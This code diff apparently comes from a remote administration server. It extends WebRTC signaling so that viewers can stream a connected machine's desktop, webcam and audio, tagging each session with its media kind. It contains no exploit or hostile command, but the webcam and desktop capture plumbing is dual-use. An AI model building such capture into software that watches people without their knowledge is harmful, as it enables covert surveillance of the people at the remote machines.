@@ -214,17 +214,22 @@ export const rdStreamingState = new Map<string, {
 const rdInputPending = new Map<string, { clientId: string; sentAt: number; kind: string }>();
 const RD_INPUT_TTL_MS = 10_000;
 
-type P2PSession = { viewer: ServerWebSocket<SocketData>; clientId: string };
+export type P2PKind = "desktop" | "webcam" | "audio";
+type P2PSession = {
+  viewer: ServerWebSocket<SocketData>;
+  clientId: string;
+  kind: P2PKind;
+};
 const p2pAgentToViewer = new Map<string, P2PSession>();
 const p2pViewerToAgent = new WeakMap<ServerWebSocket<SocketData>, string>();
 
-function createP2PSession(ws: ServerWebSocket<SocketData>, clientId: string): string {
+export function createP2PSession(ws: ServerWebSocket<SocketData>, clientId: string, kind: P2PKind): string {
   const prior = p2pViewerToAgent.get(ws);
   if (prior) {
     p2pAgentToViewer.delete(prior);
   }
   const sessionId = uuidv4();
-  p2pAgentToViewer.set(sessionId, { viewer: ws, clientId });
+  p2pAgentToViewer.set(sessionId, { viewer: ws, clientId, kind });
   p2pViewerToAgent.set(ws, sessionId);
   return sessionId;
 }
@@ -233,14 +238,20 @@ function lookupP2PSession(sessionId: string): P2PSession | undefined {
   return p2pAgentToViewer.get(sessionId);
 }
 
-function clearP2PSessionForViewer(ws: ServerWebSocket<SocketData>): { sessionId: string; clientId: string } | null {
+export function getP2PSessionIdForViewer(ws: ServerWebSocket<SocketData>): string | undefined {
+  return p2pViewerToAgent.get(ws);
+}
+
+export function clearP2PSessionForViewer(ws: ServerWebSocket<SocketData>):
+  | { sessionId: string; clientId: string; kind: P2PKind }
+  | null {
   const sessionId = p2pViewerToAgent.get(ws);
   if (!sessionId) return null;
   const entry = p2pAgentToViewer.get(sessionId);
   p2pAgentToViewer.delete(sessionId);
   p2pViewerToAgent.delete(ws);
   if (!entry) return null;
-  return { sessionId, clientId: entry.clientId };
+  return { sessionId, clientId: entry.clientId, kind: entry.kind };
 }
 
 function pruneRdInputPending(now = Date.now()) {
@@ -415,13 +426,16 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
           }
         }
         if ((payload as any).webrtc === true) {
-          const streamPath = webrtcStreamPathFor(clientId);
+          const streamPath = webrtcStreamPathFor(clientId, "desktop");
           const token = issueWebrtcPublishToken(clientId);
           const whipPath = `/api/webrtc/${streamPath}/whip`;
           sendDesktopCommand(target, "webrtc_publish", {
             streamPath,
             whipPath,
             token,
+            kind: "desktop",
+            hasVideo: true,
+            hasAudio: false,
           });
           safeSendViewer(ws, {
             type: "webrtc_ready",
@@ -442,7 +456,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         .filter(s => s.id !== ws.data.sessionId);
       if (otherViewers.length === 0) {
         sendDesktopCommand(target, "desktop_stop", {});
-        sendDesktopCommand(target, "webrtc_stop", {});
+        sendDesktopCommand(target, "webrtc_stop", { kind: "desktop" });
         if (state.isStreaming) {
           state.isStreaming = false;
           rdStreamingState.set(clientId, state);
@@ -591,8 +605,8 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
     case "webrtc_p2p_offer": {
       const sdp = typeof (payload as any).sdp === "string" ? (payload as any).sdp : "";
       if (!sdp) break;
-      const sessionId = createP2PSession(ws, clientId);
-      sendDesktopCommand(target, "webrtc_p2p_offer", { sessionId, sdp });
+      const sessionId = createP2PSession(ws, clientId, "desktop");
+      sendDesktopCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "desktop", hasVideo: true, hasAudio: false });
       break;
     }
     case "webrtc_p2p_ice": {
@@ -602,6 +616,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       if (!candidate) break;
       sendDesktopCommand(target, "webrtc_p2p_ice", {
         sessionId,
+        kind: "desktop",
         candidate,
         sdpMid: typeof (payload as any).sdpMid === "string" ? (payload as any).sdpMid : "",
         sdpMLineIndex: Number((payload as any).sdpMLineIndex) || 0,
@@ -611,7 +626,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
     case "webrtc_p2p_stop": {
       const cleared = clearP2PSessionForViewer(ws);
       if (cleared) {
-        sendDesktopCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId });
+        sendDesktopCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId, kind: cleared.kind });
       }
       break;
     }
@@ -620,13 +635,23 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
   }
 }
 
+function sendP2PSignalingToViewer(session: P2PSession, msg: Record<string, unknown>) {
+  if (session.kind === "audio") {
+    try { session.viewer.send(JSON.stringify(msg)); } catch (err) {
+      logger.error("[audio] p2p signaling send failed", err);
+    }
+    return;
+  }
+  safeSendViewer(session.viewer, msg);
+}
+
 export function handleWebrtcP2PAnswer(_clientId: string, payload: any) {
   const sessionId = typeof payload?.sessionId === "string" ? payload.sessionId : "";
   const sdp = typeof payload?.sdp === "string" ? payload.sdp : "";
   if (!sessionId || !sdp) return;
   const session = lookupP2PSession(sessionId);
   if (!session) return;
-  safeSendViewer(session.viewer, { type: "webrtc_p2p_answer", sdp });
+  sendP2PSignalingToViewer(session, { type: "webrtc_p2p_answer", sdp });
 }
 
 export function handleWebrtcP2PIce(_clientId: string, payload: any) {
@@ -635,7 +660,7 @@ export function handleWebrtcP2PIce(_clientId: string, payload: any) {
   if (!sessionId || !candidate) return;
   const session = lookupP2PSession(sessionId);
   if (!session) return;
-  safeSendViewer(session.viewer, {
+  sendP2PSignalingToViewer(session, {
     type: "webrtc_p2p_ice",
     candidate,
     sdpMid: typeof payload?.sdpMid === "string" ? payload.sdpMid : "",
@@ -643,14 +668,16 @@ export function handleWebrtcP2PIce(_clientId: string, payload: any) {
   });
 }
 
-export function cleanupRdViewerP2P(ws: ServerWebSocket<SocketData>) {
+export function cleanupViewerP2P(ws: ServerWebSocket<SocketData>) {
   const cleared = clearP2PSessionForViewer(ws);
   if (!cleared) return;
   const target = clientManager.getClient(cleared.clientId);
   if (target) {
-    sendDesktopCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId });
+    sendDesktopCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId, kind: cleared.kind });
   }
 }
+
+export const cleanupRdViewerP2P = cleanupViewerP2P;
 
 function handleRemoteDesktopFrame(payload: any) {
   const clientId = payload.clientId as string;
@@ -826,6 +853,23 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
       if (!state.isStreaming) {
         sendDesktopCommand(target, "webcam_set_fps", { fps: state.fps, useMax: state.useMax });
         sendDesktopCommand(target, "webcam_set_quality", { quality: state.quality, codec: state.codec });
+        if ((payload as any).webrtc === true) {
+          const streamPath = webrtcStreamPathFor(clientId, "webcam");
+          const token = issueWebrtcPublishToken(clientId);
+          sendDesktopCommand(target, "webrtc_publish", {
+            streamPath,
+            whipPath: `/api/webrtc/${streamPath}/whip`,
+            token,
+            kind: "webcam",
+            hasVideo: true,
+            hasAudio: false,
+          });
+          safeSendViewer(ws, {
+            type: "webrtc_ready",
+            streamPath,
+            whepPath: `/api/webrtc/${streamPath}/whep`,
+          });
+        }
         sendDesktopCommand(target, "webcam_start", {});
         state.isStreaming = true;
         webcamStreamingState.set(clientId, state);
@@ -845,10 +889,39 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
         .filter(s => s.id !== ws.data.sessionId);
       if (otherWebcamViewers.length === 0) {
         sendDesktopCommand(target, "webcam_stop", {});
+        sendDesktopCommand(target, "webrtc_stop", { kind: "webcam" });
         state.isStreaming = false;
         webcamStreamingState.set(clientId, state);
       } else {
         logger.debug(`[webcam] ignoring webcam_stop for client ${clientId} - ${otherWebcamViewers.length} other viewer(s) still active`);
+      }
+      break;
+    }
+    case "webrtc_p2p_offer": {
+      const sdp = typeof (payload as any).sdp === "string" ? (payload as any).sdp : "";
+      if (!sdp) break;
+      const sessionId = createP2PSession(ws, clientId, "webcam");
+      sendDesktopCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "webcam", hasVideo: true, hasAudio: false });
+      break;
+    }
+    case "webrtc_p2p_ice": {
+      const sessionId = p2pViewerToAgent.get(ws);
+      if (!sessionId) break;
+      const candidate = typeof (payload as any).candidate === "string" ? (payload as any).candidate : "";
+      if (!candidate) break;
+      sendDesktopCommand(target, "webrtc_p2p_ice", {
+        sessionId,
+        kind: "webcam",
+        candidate,
+        sdpMid: typeof (payload as any).sdpMid === "string" ? (payload as any).sdpMid : "",
+        sdpMLineIndex: Number((payload as any).sdpMLineIndex) || 0,
+      });
+      break;
+    }
+    case "webrtc_p2p_stop": {
+      const cleared = clearP2PSessionForViewer(ws);
+      if (cleared) {
+        sendDesktopCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId, kind: cleared.kind });
       }
       break;
     }
